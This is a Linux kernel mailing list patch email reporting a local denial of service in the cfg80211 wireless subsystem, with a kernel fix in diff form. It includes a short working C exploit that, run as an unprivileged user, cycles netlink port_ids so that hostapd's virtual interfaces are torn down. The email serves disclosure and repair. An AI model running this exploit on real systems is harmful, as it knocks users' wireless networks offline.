Return-path: <linux-wireless-owner@vger.kernel.org>
Received: from mail-qg0-f44.google.com ([209.85.192.44]:33250 "EHLO
	mail-qg0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S932302AbcDDPR1 (ORCPT
	<rfc822;linux-wireless@vger.kernel.org>);
	Mon, 4 Apr 2016 11:17:27 -0400
Received: by mail-qg0-f44.google.com with SMTP id j35so154245506qge.0
        for <linux-wireless@vger.kernel.org>; Mon, 04 Apr 2016 08:17:26 -0700 (PDT)
MIME-Version: 1.0
Date: Mon, 4 Apr 2016 18:17:25 +0300
Message-ID: <CAFSVvRfjZszSfovXZ0piPqOgVKH=10sG7pvnvkoWJChL38ifqQ@mail.gmail.com> (sfid-20160404_171731_309095_517B9817)
Subject: [PATCH] Fix local DoS in cfg80211 subsystem
From: Dmitrijs Ivanovs <dmitrijs.ivanovs@ubnt.com>
To: linux-wireless@vger.kernel.org
Content-Type: text/plain; charset=UTF-8
Sender: linux-wireless-owner@vger.kernel.org
List-ID: <linux-wireless.vger.kernel.org>

When hostapd is configured with more than one BSS and daemonized,
subsequent call to any tool like "iw" which opens and then closes
netlink socket may suddenly remove virtual interfaces created by
hostapd (such as wlan0-1). In fact, any non-privileged user can create
netlink socket with the same port_id as used by hostapd (port_id is
equal to pid before daemonization). Although bind() will fail in that
case, nl80211 subsystem will receive notification and remove
interfaces. Here is simple exploit:

#include <sys/socket.h>
#include <linux/netlink.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

int main()
{
    unsigned int port_id;
    int sock_fd;
    int bind_rv;
    struct sockaddr_nl src_addr;

    if(!getuid())
    {
        if(setuid(1234))
        {
            perror("Cannot drop root privileges - UID");
            return -1;
        }
        if(setuid(1234))
        {
            perror("Cannot drop root privileges - GID");
            return -1;
        }
    }

    for(port_id = 0; port_id < 65536; port_id++)
    {
        sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
        if(sock_fd < 0)
        {
            return -1;
        }
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.nl_family = AF_NETLINK;
        src_addr.nl_pid = port_id;

        bind_rv = bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
        if(bind_rv)
        {
            fprintf(stderr, "Bind failed for port_id %i: %s\n",
port_id, strerror(errno));
        }
        close(sock_fd);
    }
}

The patch below corrects this problem in kernel space. Also, it is
recommended to ensure that user-space applications are not using
user-supplied port_id for netlink sockets (which is default in
libnl-tiny for example).

Signed-off-by: Dmitry Ivanov <dima@ubnt.com>

---
 include/linux/netlink.h  | 1 +
 net/netlink/af_netlink.c | 1 +
 net/wireless/nl80211.c   | 4 +++-
 3 files changed, 5 insertions(+), 1 deletion(-)

diff --git a/include/linux/netlink.h b/include/linux/netlink.h
index da14ab6..4a13b3c 100644
--- a/include/linux/netlink.h
+++ b/include/linux/netlink.h
@@ -138,6 +138,7 @@ struct netlink_notify {
     struct net *net;
     u32 portid;
     int protocol;
+    bool bound;
 };

 struct nlmsghdr *
diff --git a/net/netlink/af_netlink.c b/net/netlink/af_netlink.c
index 215fc08..0640864 100644
--- a/net/netlink/af_netlink.c
+++ b/net/netlink/af_netlink.c
@@ -693,6 +693,7 @@ static int netlink_release(struct socket *sock)
                         .net = sock_net(sk),
                         .protocol = sk->sk_protocol,
                         .portid = nlk->portid,
+                        .bound = nlk->bound,
                       };
         atomic_notifier_call_chain(&netlink_chain,
                 NETLINK_URELEASE, &n);
diff --git a/net/wireless/nl80211.c b/net/wireless/nl80211.c
index 98c9242..3099200 100644
--- a/net/wireless/nl80211.c
+++ b/net/wireless/nl80211.c
@@ -13216,7 +13216,9 @@ static int nl80211_netlink_notify(struct
notifier_block * nb,
     struct wireless_dev *wdev;
     struct cfg80211_beacon_registration *reg, *tmp;

-    if (state != NETLINK_URELEASE)
+    if (state != NETLINK_URELEASE ||
+        notify->protocol != NETLINK_GENERIC ||
+        !notify->bound)
         return NOTIFY_DONE;

     rcu_read_lock();
-- 
2.1.4
